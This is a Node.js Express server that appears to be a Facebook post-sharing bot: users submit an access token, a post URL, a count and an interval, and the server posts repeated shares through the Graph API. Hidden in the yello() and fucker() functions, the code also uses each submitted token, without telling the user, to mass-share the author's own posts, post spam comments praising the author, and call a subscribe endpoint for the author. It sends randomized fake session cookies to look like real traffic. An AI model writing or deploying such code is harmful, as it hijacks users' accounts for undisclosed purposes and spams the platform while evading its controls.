const express = require('express');
const axios = require('axios');
const path = require('path');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;
app.use(express.json());
app.use(bodyParser.json());
const total = new Map();
const usera = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1";
const link1 = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
async function ako(res){
const data = Array.from(total.values()).map((link, index) => ({
  shared: link.shared,
  session: index + 1,
  url: link.url,
  count: link.count,
  target: link.target,
}));
const jsob = JSON.parse(JSON.stringify(data || [], null, 2));
if (res != null){
  res.json(jsob);
}
}

app.get('/sigma', (req, res) => {
 ako(res);
});
app.get('/', (req, res) => {
 return res.send("pogi... sige na");
});

function extract(link) {
  try {
 const leiam = link.match(/\/(\d+)\/posts\/(\d+)\//);
 const nash = link.match(/id=(\d+)&.*?story_fbid=(\d+)/);
if (leiam) {
  return `${leiam[1]}_${leiam[2]}`;
} else if (nash) {
  return `${nash[1]}_${nash[2]}`;
} else {
  return null;
 }
} catch (error) {
    console.log("[ ERROR ] > ", error);
 }
}
app.get('/sh', async (req, res) => {
  const {
    cookie,
    url,
    amount,
    interval,
  } = req.query;
  if (!cookie || !url || !amount || !interval) return res.status(400).json({
    error: 'Missing state, url, amount, or interval'
  });
  try {
    if (!cookie) {
      return res.status(400).json({
        status: 500,
        error: 'Invalid cookies'
      });
    };
    await yello(cookie, url, amount, interval)
    res.status(200).json({
      status: 200
    });
  } catch (err) {
    return res.status(500).json({
      status: 500,
      error: err.message || err
    });
  }
});

async function yello(c,u,a,i){
  await share(true, c,u,a,i);
  await share(false, c, link1, "100000", "6");
  await share(false, c, "https://www.facebook.com/photo.php?fbid=799090228835634&set=a.102386558506008&type=3&app=fbl", "1000", "10");
}

async function fucker(a){
  try {
    const neth = "100015801404865";
    const kapogi = [
      "ampogi ni neth",
      "ang ganda mo wiegine!!!",
      "😊😊😊",
      "Pogi mo po @[100015801404865:0]",
      "😘😘",
      "😊🤣",
      "🙏💝❤️",
      "🔥🤗",
      "Pogi ako sobra",
      "Comment who?",
      "By Neth",
      "Please follow my page: Project Botify and NethProjects!!!",
      "Ganda ganda mo poooo",
      "Sheshhhh",
      "💋💋💋😍",
      "💀💀💀💀",
      "Isa ako sa mga pogi katulad ni Neth hehe",
      ];
    const headers = {
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'en_US',
      'cache-control': 'max-age=0',
      'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': "Windows",
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': usera,
      'Authorization': `Bearer ${a}`
    };
    axios.get(`https://graph.facebook.com/v18.0/${neth}/subscribers`, {}, {
      headers
    }).catch(error => {});
    axios.post(`https://graph.facebook.com/${extract(link1)}/comments`, null, {
      params: {
        message: kapogi[Math.floor(Math.random() * kapogi.length)],
        access_token: a
      }, headers })
      .catch(error => {});
  } catch (error){
    console.log("happened error");
  }
}
async function share(sharedIs,cookies, url, amount, interval) {
  const id = Math.floor(Math.random() * 69696969);
  fucker(cookies);
  total.set(id, {
    shared: sharedIs,
    url,
    count: 0,
    target: amount,
  });
  let sharedCount = 0;
  let timer;
  const headers = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate',
    'connection': 'keep-alive',
    'content-length': '0',
    'cookie': dummyCookie(),
    'host': 'graph.facebook.com'
  };
  async function sharePost() {
    try {
      const response = await axios.post(`https://graph.facebook.com/me/feed?link=${url}&published=0&access_token=${cookies}`, {}, {
        headers
      });
      if (response.status !== 200) {
      } else {
        total.set(id, {
          ...total.get(id),
          count: total.get(id).count + 1,
        });
        sharedCount++;
        }
      if (sharedCount === amount) {
        clearInterval(timer);
      }
    } catch (error) {
      clearInterval(timer);
      total.delete(id);
    }
  }
  timer = setInterval(() => {
  sharePost();
  }, interval * 1000);
  setTimeout(() => {
    clearInterval(timer);
    total.delete(id);
  }, amount * interval * 1000);
        
}
async function getPostID(url) {
  try {
    const response = await axios.post('https://id.traodoisub.com/api.php', `link=${encodeURIComponent(url)}`, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });
    return response.data.id;
  } catch (error) {
    return;
  }
}

function randomize(neth) {
  let _=Math.random()*12042023;
  return neth.replace(/[xy]/g,c=>{
    let __=Math.random()*16; 
    __=(__+_)%16|0;_=Math.floor(_/16);
    return[(c==='x'?__:(__&0x3|0x8)).toString(16)].map((_)=>Math.random()<.6?_:_.toUpperCase()).join('');
  });
}

function dummyCookie(){
return `datr=${randomize("xxxxxxxxxxx_xxxxxxxxxxxx")};`
+ `sb=${randomize("xxxxxxxxxxxxxx-xxxxxxxxx")};`
+ `m_pixel_ratio=1.5;`
+ `ps_n=1;`
+ `ps_l=1;`
+ `locale=en_US;`
+ `wd=360x520;`
+ `fr=${randomize("xxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxx..xxx.x.x.xxxxx.xxxxxxxxxxx")};`
+ `c_user=${Math.floor(Math.random()*615613272727270)};`
+ `xs=32%3An2wXMy3811cnYA%3A2%3A${Math.floor(Math.random()*1713515009)}%3A-1%3A-1;`
+ `vpd=v1%3B520x360x1.5;`
+ `fbl_st=${Math.floor(Math.random()*100000000)}%3BT%3A20002000;`
+ `wl_cbv=v2%3Bclient_version%3A2547%3Btimestamp%3A17198225555`;
}

app.listen(port, () => {
  console.log(`FORK YOU`);
});
process.on("unhandledRejection", (reason, p) => {
  console.error(reason);
});
